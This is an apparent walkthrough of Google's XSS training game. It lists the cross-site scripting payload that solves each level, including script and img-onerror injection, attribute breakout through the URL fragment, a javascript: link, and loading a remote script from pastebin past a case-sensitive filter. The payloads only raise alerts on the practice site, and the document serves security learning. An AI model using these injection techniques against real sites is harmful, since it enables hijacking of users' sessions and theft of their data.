# Introduction
Cross-site scripting (XSS) bugs are one of the most common and dangerous types of vulnerabilities in Web applications. These nasty buggers can allow your enemies to steal or modify user data in your apps and you must learn to dispatch them, pronto!

At Google, we know very well how important these bugs are. In fact, Google is so serious about finding and fixing XSS issues that we are paying mercenaries up to $7,500 for dangerous XSS bugs discovered in our most sensitive products.

In this training program, you will learn to find and exploit XSS bugs. You'll use this knowledge to confuse and infuriate your adversaries by preventing such bugs from happening in your applications.

There will be cake at the end of the test.

## Level 1 - Hello, world of XSS
The input form is not sanitized, so if we insert `<script>alert('done')</script>` we will have our script injected.
## Level 2 - Persistence is key
This time, we can't insert `<script>` elements, as it seems to be sanitized by the web, so we can use `<img>` instead with `onerror` attribute.

`<img src="x" onerror="alert('done')"/>` this way, the browser will try to parse a picture, but as is not existent, on error will execute the script.
## Level 3 - That sinking feeling
Here we can't enter text, so we have to play with the URL.

```
window.onload = function() { 
        chooseTab(unescape(self.location.hash.substr(1)) || "1");
      }
```
Looking at the source code from above, we can see that if not URL fragment identifier exists `#`, it will point first to the image one `#1`, if we enter `#2` we'll go to the second image and so.

We can see this line inside the function `chooseTab(num)` 
` html += "<img src='/static/level3/cloud" + num + ".jpg' />";`
we can escape the `src` attribute by writing `'` after the `#` in the url, followed by an `onerror` cause cause no image will be found and we can comment out the .jpg end with `//`.

The url to visit would be this `https://xss-game.appspot.com/level3/frame#' onerror="alert('done')";//`

## Level 4 - Context matters
Here we can both inject the script in the form or in the url.
The function we are playing with is this one `<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />`
We can input in the form `');alert('done');var x=('`, if we want to insert it into the URL we'd have to encode it. `%27%29%3Balert%28%27done%27%29%3Bvar%20b%3D%28%27` and add it to the URL, in the timer GET parameter, i.e., `https://xss-game.appspot.com/level4/frame?timer=%27%29%3Balert%28%27done%27%29%3Bvar%20b%3D%28%27`

## Level 5 - Breaking protocol
After we click the `Sign up` link, we get into the signup.html page, where we get a predefined value for the parameter next=confirm, if we check the sourcecode `<a href="{{ next }}"> Next >></a>` we can see that the link we get to after clicking next is the next parameter value, so we can do like with **bookmarklets** and add a javascript:function() code to it.
`javascript:alert('done');`

## Level 6 - Follow the :rabbit:
Here, we can see that the webpage tries to load the "gadget" from whatever is after the # (the fragment identifier).

If we read the sourcecode we can see that the the function uses a insensitive case regex for limiting "http/s" connections, but we can bypass this just changing one letter to uppercase, or using // without http, which takes the parentory protocol.

And for hosting the code, we can use a raw pastebin or just use the `google.com/jsrapi?callback=alert('done')` function.

the url would be `https://xss-game.appspot.com/level6/frame#//pastebin.com/raw/R2wQuFMg`

<pre>                                                         -oooo:-                                                        
                                                        omhsoosho`                                                      
                                                        Ndo:``:oh-                                                      
                                                        dms+--+ym:                                                      
                                                        -ymhohdh+`                                                      
                                                         `N/`.s.                                                        
                                                          +:  +                                                         
                                                          --  :                                                         
                                                          --  o                                                         
                                                          ..  +                                                         
                                                          ::  s        ..`                                              
                                                .:sssso.  --  +     :syhhyo`                                            
                                ..::::.       `odhhyyhdd. ::  s    .mhhyhhdh.       -:...`                              
                               /dhhhhhhs     .odddhyhdddh+y:  my-syhdhhyhhddy/`   .odhyyhh:                             
                              yNdhyyoyhmo+::+ms/+++//++/odm:  NNmNd+///+++/+ody::omhyssyhdm-                            
                            -sddyyyyyyyoommmmmmdhyyyyyyhddd: `ddmdmdhyssyyhhmmNNNNdhyyyyyhmo-`                          
                        ``-omdyyyssys///shdddddddddmmdddhyy-``yhddddhhhhhdmmmmmmdd/oyssyyyyhmhss-`                      
                     `:ohhdmddhhyyyyyshddddhhyyyyyhddhhyo:-...--shhyysssyyhhdhhhddyyysyyyhdddmNNmyo.                    
                    /hNNmmd/:o+/////:`/osyhhyyys+syyhhyysysooossyyyyyooyyyyyyysyy+./oooooos/:ydNNmNmo.                  
                   +dNmmmmmhoo+///////oossshhyyyyyyyyssoossoosoosssyyyyyyyhsoyyyys/:-..--:/+sdddmmmNMy                  
                  `hNmmdmmdmddddhhhyhysso+.oyssssso-./o:-/+oo++oo--osoooooo..oyyhyyyyyyhhhyhdddmmdmNNN                  
                  `yNmNNhhdmdddhhhyyyyyyys:-......`./+++/:o++oo++/-````..::/+sysysyyyhsshhhydddmmmNNNN                  
                   sMNNNNNNmmdmdhhhhyyyyyyhhssssoo+oo/+//:/+//+:++++ooosyooyssosyyhhyhsshdhdmmNmNmmMMN                  
                   -NNNNNNhmNmdmmmdddddmhhhyyyyssys///+/:://////o+osoo+osoossosyhhdddh+omddmNNmmNmNMMN                  
                   oMNNNNNNNNdydNmmmmmdhydhhsoooodhydhsshys+soyooooosssyhyhymdhdhyddmmmdmNNNNNNmNNNMMM                  
                   yMMNNNMmmNdmmNNNNNNmh/sysyysyhyddmhhyhyhhddyyyhmddhhdmdddmmmdmmmmNNmmmNmNNNNmMNMMMM                  
                  .dMMNNMMNNNmNNNNNNmmNNhsddddNNdmhdmddyyhdhdhdddhdmhhdddhmddmmmNNNNNNNNNNNNNNNNMNMMMM                  
                  :NMMMNMMNMNhhmNNNNmdmNNmhddmdNmmmmmmddddNmdhdhddddmddmmmmmmNdNmdmmNNNmNNNNNdmMMMMMMM                  
                  -mMMMMMNNmNNmNNNNNNNNNNNdmmNmNmNmNmmNNmmNNdhddmmmmNmhhhyohNMNMNmmmmNdmNNMMMNNMMMMMMM                  
                  .dMMMMMMNNNMMMMMNNNNNMNmmmNNNmmmmNNdddmmNNNmmdNNmNNNmmNNNNNNNNNNNNNNNmNNNNNmNMMMMMMM                  
                  :NMMMMMMMMMMMMMMMNmmNMNNNNNNNmmNmNNNNmdmNNNNNNNmNNdmNNMMNMmNNNNNNMMNdmNNNMNmmMMMMMMM                  
                  :NNMMMMMMMMMMMMMMMMNNMNNMNNNMMMNNNNNNmNmdmmmNNNNNNmmNNNNNNNNNNMNNMMMNNNNMMNmMMMMNNMN                  
                  :NMMMNNMMMMMMMMMMMMMNNMMMMNMMMNmNNMNNNNNmhNMNNMNNNMMNMMMMMNNMMNNNMNMMMMNMMNNMMNMNMMM                  
                  `hMMMNdMNNMNNNNNMMNNNNMMMMMMMMNmNMMMMNNNNNNNdmmmMNMMMMMMNNMMNmdNMMNMNNNNMNmmNMNMMMMN                  
                   yMMMMNMMNMNmmNNNMNmddmMMNNNMNNNNNMMNNNNMNNNNNNNmNNNNNNNNNNNNNddNdmdmmNNMNNdMMMMMMMN                  
                   yMMMMNMNMMNNMMNNNNmdmmNMNNdhmMNNNNNNmNMMddddmNNNmNNMMNmNmmmmmNNmmmmNMMMMMMNNNMMMMMN                  
                   yNNNMMNNMMMMMMNNNNNMmmdNNNNNNNNNNNNmNNNNNmNmmNNNNNNNNNNNmNmNNNNNNNNNNNNNMMMNNMMMMMy                  
                   +MMMMMMMMMMMNNNNMMMNNNNmNNNMNMNNMNNmhdNNNNNmNNNmmNNNNNNNNNNNMMNNmNNNNNMNMNMMMMMMMN:                  
                    NMMMMNMMMMMMMNNNNNNdNMNNNNNNmNNNNNNNNNmmhNNNNmdNNNNNNNNNMMNNMNNNNNNNNNMMMMNNMMMNs`                  
                    -sdmNMNNMMMMMNNNNmmmmNNNMNmNMNNNNNNNMNmNNNNNNmmmdmNNNMNmmmmNMNNMNMmmNNMMMNMNmd+-`                   
                      `.ohNNMMNMMNMNNmdmNNNNNNmNMNNMNNNNmNNNmmmNmNMMNNMNNMMNNNNNNNNNNMMMMMMMNNho.`                      
                          :+hdNNNNNNNNNNNNNNmNNNNNNNMNNNmNNNNmMmmmNNNMNNNNNNNNMNNMMMMMNNmdds/-                          
                             `--:+shddmmNmmmmNNNNMNNNMNNNNNNNNNNMMNMMMNNNmNNNMNNNNdh++/-.`                              
                                     `--++osdddddddysNmmhshmmmmmNmddddddho/:++/---                                      
                                                    `-.-. .------.                                 

    </pre>
